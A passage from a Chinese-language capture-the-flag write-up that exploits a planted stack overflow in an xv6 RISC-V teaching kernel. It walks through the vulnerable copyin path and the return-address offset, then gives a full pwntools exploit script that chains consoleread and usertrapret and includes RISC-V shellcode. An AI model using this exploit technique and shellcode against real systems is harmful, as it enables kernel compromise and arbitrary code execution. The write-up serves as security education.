    if (argint(1, &n) < 0 || argaddr(0, &p) < 0)
        return -1;
    return do_overflow(p, n);
}

uint64
do_overflow(uint64 src, int sz)
{
    char buf[0x20];
    return copyin(myproc()->pagetable, buf, src, sz);
}
```

copyin调用了memmove，从用户栈传n个字节到dst

```c
// Copy from user to kernel.
// Copy len bytes to dst from virtual address srcva in a given page table.
// Return 0 on success, -1 on error.
int copyin(pagetable_t pagetable, char *dst, uint64 srcva, uint64 len)
{
    uint64 n, va0, pa0;

    while (len > 0)
    {
        va0 = PGROUNDDOWN(srcva);
        pa0 = walkaddr(pagetable, va0);
        if (pa0 == 0)
            return -1;
        n = PGSIZE - (srcva - va0);
        if (n > len)
            n = len;
        memmove(dst, (void *)(pa0 + (srcva - va0)), n); // user stack -> dst[0:n]

        len -= n;
        dst += n;
        srcva = va0 + PGSIZE;
    }
    return 0;
}
```

调用链为：

* baby(input, size)
* do_overflow(p, n)  p = input, n = size
* memmove(dst, src, n) dst = buf, src = input, n = size

所以baby()是将input的内容传size大小给do_overflow()中的buf[0x20]，由于size可控，所以可以溢出内核态的buf

这里的思路的是利用do_overflow返回时的寄存器`a0,a1,a2`分别正好是`0, (void *)(pa0 + (srcva - va0)), n`，如果返回到read函数就能直接往用户栈上读，做riscv用户态的栈溢出

把kernel objdump下来，返回地址在buf+0x28处

```assembly
00000000800041be <do_overflow>:
    800041be:	7139                	addi	sp,sp,-64
    800041c0:	fc06                	sd	ra,56(sp)   # ra = sp+56
    800041c2:	f822                	sd	s0,48(sp)   
    800041c4:	0080                	addi	s0,sp,64    # s0 -> stack_top
    800041c6:	fca43423          	sd	a0,-56(s0)
    800041ca:	87ae                	mv	a5,a1
    800041cc:	fcf42223          	sw	a5,-60(s0)
    800041d0:	ffffe097          	auipc	ra,0xffffe
    800041d4:	450080e7          	jalr	1104(ra) # 80002620 <myproc>
    800041d8:	87aa                	mv	a5,a0
    800041da:	6bbc                	ld	a5,80(a5)
    800041dc:	fc442683          	lw	a3,-60(s0)
    800041e0:	fd040713          	addi	a4,s0,-48  # a4 = s0-48 = sp+16
    800041e4:	fc843603          	ld	a2,-56(s0)
    800041e8:	85ba                	mv	a1,a4   # a4 -> buf
    800041ea:	853e                	mv	a0,a5
    800041ec:	ffffe097          	auipc	ra,0xffffe
    800041f0:	fd4080e7          	jalr	-44(ra) # 800021c0 <copyin>
    800041f4:	87aa                	mv	a5,a0
    800041f6:	853e                	mv	a0,a5
    800041f8:	70e2                	ld	ra,56(sp)
    800041fa:	7442                	ld	s0,48(sp)
    800041fc:	6121                	addi	sp,sp,64
    800041fe:	8082                	ret
```

接下来是内核态的一些函数

* 在内核里read由consoleread()实现

```c
// console.c
consoleinit(void)
{
  initlock(&cons.lock, "cons");

  uartinit();

  // connect read and write system calls
  // to consoleread and consolewrite.
  devsw[CONSOLE].read = consoleread;
  devsw[CONSOLE].write = consolewrite;
}
```

* usertrap用于响应用户态的syscall、异常等，在最后利用usertrapret()返回到用户态

```c
//
// handle an interrupt, exception, or system call from user space.
// called from trampoline.S
//
void
usertrap(void)
{
  int which_dev = 0;

  if((r_sstatus() & SSTATUS_SPP) != 0)
    panic("usertrap: not from user mode");

  // send interrupts and exceptions to kerneltrap(),
  // since we're now in the kernel.
  w_stvec((uint64)kernelvec);

  struct proc *p = myproc();
  
  // save user program counter.
  p->trapframe->epc = r_sepc();
  
  if(r_scause() == 8){
    // system call

    if(p->killed)
      exit(-1);

    // sepc points to the ecall instruction,
    // but we want to return to the next instruction.
    p->trapframe->epc += 4;

    // an interrupt will change sstatus &c registers,
    // so don't enable until done with those registers.
    intr_on();

    syscall();
  } else if((which_dev = devintr()) != 0){
    // ok
  } else {
    printf("usertrap(): unexpected scause %p pid=%d\n", r_scause(), p->pid);
    printf("            sepc=%p stval=%p\n", r_sepc(), r_stval());
    p->killed = 1;
  }

  if(p->killed)
    exit(-1);

  // give up the CPU if this is a timer interrupt.
  if(which_dev == 2)
    yield();

  usertrapret();
}
```

我们先跳到consoleread，再usertrapret回到用户态

```python
payload = 'a'*0x28 + p64(elf.sym['consoleread']+6)
payload += 'a'*0x28 + p64(elf.sym['usertrapret'])

r.sendlineafter("send?\n", str(0xc0))
r.sendlineafter("input\n", payload)
```

![](https://i.loli.net/2021/02/01/VqiYQKltFafP6Xn.png)

读risc-v的shellcode到用户栈上，返回到用户态再通过栈溢出return to shellcode

由于console.c设置了缓冲区长度，一次最多只能读入0x80个字节，所以得读两次

```c
struct {
  struct spinlock lock;
  
  // input
#define INPUT_BUF 128
  char buf[INPUT_BUF];
  uint r;  // Read index
  uint w;  // Write index
  uint e;  // Edit index
} cons;
```

完整exp如下

```python
from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'

r = process("./run.sh")

elf = ELF("kernel", checksec=False)

payload = 'a'*0x28 + p64(elf.sym['consoleread']+6)
payload += 'a'*0x28 + p64(elf.sym['usertrapret'])

r.sendlineafter("send?\n", str(0xc0))
r.sendlineafter("input\n", payload)

shellcode = b"\x9d\x64\x9b\x84\x34\x87\x23\x3c\x91\xfe\x23\x30\x91\xfe\x23\x38\x01\xfe\x13\x05\x01\xfe\x23\x34\xa1\xfe\x13\x05\x81\xff\x93\x05\x81\xfe\x9d\x48\x73\x00\x00\x00"

payload = shellcode.ljust(0x90, b'a')
payload += p64(0x2f28)

r.recvuntil("\x00\x00\x00\x00\n")
r.send(payload[:0x80])
sleep(0.5)
# raw_input()
r.sendline(payload[0x80:])

r.interactive()
```







